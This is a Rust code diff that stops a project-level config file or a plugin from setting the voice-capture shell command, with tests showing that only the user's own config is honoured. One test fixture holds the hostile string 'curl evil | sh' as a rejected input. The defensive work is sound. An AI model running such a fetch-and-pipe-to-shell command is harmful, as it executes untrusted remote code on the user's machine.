@@ -120,6 +120,40 @@ impl SettingsStack {
         &self.layers
     }
 
+    /// `voice.capture_cmd`, but only if a layer that is allowed to hold a
+    /// shell command set it. A repository's `.ah/config.toml` arrives on the
+    /// stack like any other file, so a clone could otherwise run a command on
+    /// the machine that opened it.
+    pub fn capture_cmd(&self) -> String {
+        if let Ok(v) = std::env::var("AH_VOICE_CAPTURE_CMD") {
+            let v = v.trim();
+            if !v.is_empty() {
+                return v.to_string();
+            }
+        }
+        let user = crate::paths::user_config_file();
+        let mut found = String::new();
+        for l in &self.layers {
+            let trusted = match &l.origin {
+                Origin::Defaults | Origin::Cli => true,
+                Origin::File(p) => *p == user,
+                Origin::Plugin(_) | Origin::Runtime(_) => false,
+            };
+            let Some(cmd) = l
+                .patch
+                .get("voice")
+                .and_then(|v| v.get("capture_cmd"))
+                .and_then(|v| v.as_str())
+            else {
+                continue;
+            };
+            if trusted {
+                found = cmd.trim().to_string();
+            }
+        }
+        found
+    }
+
     /// Render the merged settings as TOML.
     pub fn to_toml(&self) -> String {
         toml::to_string_pretty(&self.resolved)
@@ -161,6 +195,35 @@ fn unset_markers(v: &mut Value) {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn capture_cmd_is_refused_from_a_project_file() {
+        let mut s = SettingsStack::new();
+        s.push(
+            Origin::File("/some/repo/.ah/config.toml".into()),
+            serde_json::json!({"voice": {"capture_cmd": "curl evil | sh"}}),
+        )
+        .unwrap();
+        assert_eq!(s.settings().voice.capture_cmd, "curl evil | sh");
+        assert_eq!(s.capture_cmd(), "");
+        s.push(
+            Origin::Plugin("p".into()),
+            serde_json::json!({"voice": {"capture_cmd": "also evil"}}),
+        )
+        .unwrap();
+        assert_eq!(s.capture_cmd(), "");
+    }
+
+    #[test]
+    fn capture_cmd_is_taken_from_the_user_config() {
+        let mut s = SettingsStack::new();
+        s.push(
+            Origin::File(crate::paths::user_config_file()),
+            serde_json::json!({"voice": {"capture_cmd": "arecord -q -f S16_LE -r 16000 -c1 -"}}),
+        )
+        .unwrap();
+        assert_eq!(s.capture_cmd(), "arecord -q -f S16_LE -r 16000 -c1 -");
+    }
 
     #[test]
     fn layers_merge_in_order() {
